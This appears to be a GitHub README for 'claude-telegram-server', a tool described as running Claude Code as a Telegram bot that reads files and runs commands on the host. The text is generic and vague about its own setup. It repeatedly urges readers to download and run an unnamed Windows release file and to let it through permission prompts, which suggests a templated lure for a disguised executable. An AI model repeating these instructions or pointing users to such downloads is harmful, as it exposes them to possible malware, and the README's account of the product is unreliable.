# 🤖 claude-telegram-server - Run Claude in Telegram, 24/7

[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge)](https://github.com/Hewechargeable220/claude-telegram-server/releases)

## 📌 What this is

`claude-telegram-server` lets you run Claude Code as a Telegram bot on your own machine. You send a message from Telegram, and Claude can read files, write code, run commands, and reply in the chat.

It is built for people who want remote access to their coding helper from a phone or another device. You can keep it running on Windows, macOS, or Linux.

## 🪟 Windows quick start

If you want to use this on Windows, go to the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases) and download and run the latest Windows file.

### What you need

- A Windows 10 or Windows 11 PC
- Internet access
- A Telegram account
- An Anthropic Claude account or access token
- Claude Code installed on the machine
- Enough disk space for your files and any code projects you want to manage

## 📥 Download and install

1. Open the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases)
2. Find the latest release
3. Download the Windows file for your computer
4. Run the file
5. If Windows asks for permission, choose the option that lets the app run
6. Follow the on-screen setup steps

If you use a ZIP file, extract it first, then run the app from the extracted folder.

## 🔧 Set up Telegram

To use the bot, you need a Telegram bot token.

1. Open Telegram
2. Search for `@BotFather`
3. Start a chat
4. Create a new bot
5. Copy the bot token
6. Save it for setup

You also need your Telegram chat ID if the app asks for it. This helps the bot know who can talk to it.

## 🧠 Set up Claude Code

This app uses Claude Code on your machine. That means the bot can work with local files and commands through your computer.

Make sure:

- Claude Code is installed
- You can run it on your machine
- Your Anthropic settings are ready
- The machine has access to the folders you want Claude to use

If the app asks for an API key or login details, enter the values from your Claude or Anthropic setup.

## ⚙️ Basic setup steps

After you download and run the app:

1. Open the app or start the server file
2. Enter your Telegram bot token
3. Enter your Claude or Anthropic details
4. Set the folder Claude should use
5. Save the settings
6. Start the server
7. Send a test message to your bot in Telegram

If the app includes a config file, fill in the values there, then restart the app.

## 💬 How to use it

Once the bot is running, you can send messages in Telegram such as:

- Read this file and explain it
- Fix this code
- Create a simple script
- Run the test suite
- Check this folder for errors
- Update this app so it handles blank input

Claude can then work with the files on the machine and reply in Telegram.

## 🧩 Main features

- Runs Claude Code as a Telegram bot
- Works on Windows, macOS, and Linux
- Lets you send commands from your phone
- Reads files from a local folder
- Writes and edits code
- Runs commands on the host machine
- Sends replies back to Telegram
- Supports long-running use on a personal machine or server
- Fits remote development and home lab use

## 🖥️ Windows tips

If you want the best results on Windows:

- Keep the app in a folder with a short path
- Use a folder you can find again
- Run the app with the same user account each time
- Keep Telegram signed in on your phone
- Leave the machine on if you want the bot to stay online

If the bot stops responding, check that:

- The app is still running
- Your internet connection works
- The bot token is correct
- Claude Code can still access the folder you set

## 🔒 Access control

This kind of bot can touch real files and run real commands, so keep access limited.

Use it with:

- A private Telegram bot
- A chat ID that only you use
- A folder with the right files
- A machine you control

If the app supports allowlists, set them for your Telegram user or chat.

## 🗂️ Example use cases

- Ask Claude to inspect a project while you are away from your desk
- Send a quick fix request from your phone
- Review logs without opening your laptop
- Update code in a remote dev machine
- Keep a coding assistant running on a home server
- Automate small tasks in a trusted folder

## 🛠️ Troubleshooting

### The bot does not reply

Check these items:

- The server is running
- The Telegram token is correct
- The bot is not blocked in Telegram
- Your machine has internet access
- Claude Code is installed and ready

### Claude cannot find files

Check the working folder in the settings. Make sure the folder exists and the path is correct.

### Commands do not run

Make sure the app has permission to use the folder and start commands on your machine. On Windows, try running the app with the right account.

### The app closes right away

This often means the setup is not complete. Open the app from a terminal window if the release gives you that option, so you can see the error message.

## 📦 Release notes to check

When you visit the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases), look for:

- The latest version
- Windows download files
- ZIP archives if no installer is listed
- Setup notes from the release author

## 🧭 Folder use

The bot works best when you give it one main folder to manage. That keeps file access clear and simple.

Good choices include:

- A project folder
- A code workspace
- A test folder
- A local repo you want Claude to edit

Avoid giving it a large drive unless you need that much access.

## 🧪 What to expect after setup

After setup, the flow is simple:

1. Start the server on your machine
2. Open Telegram
3. Send a message to the bot
4. Claude reads the request
5. Claude works in the chosen folder
6. The bot sends the result back to Telegram

## 🔗 Download again

Visit the [releases page](https://github.com/Hewechargeable220/claude-telegram-server/releases) to download and run the latest Windows file

## 📝 Repository topics

This project fits these areas:

- AI assistant
- Automation
- Chatbot
- Claude Code
- Telegram bot
- Remote development
- Headless server
- Developer tools
- MCP

## 🧰 Simple setup checklist

- [ ] Download the latest release
- [ ] Run the Windows file
- [ ] Create a Telegram bot
- [ ] Save the bot token
- [ ] Install or sign in to Claude Code
- [ ] Pick one working folder
- [ ] Start the server
- [ ] Send a test message in Telegram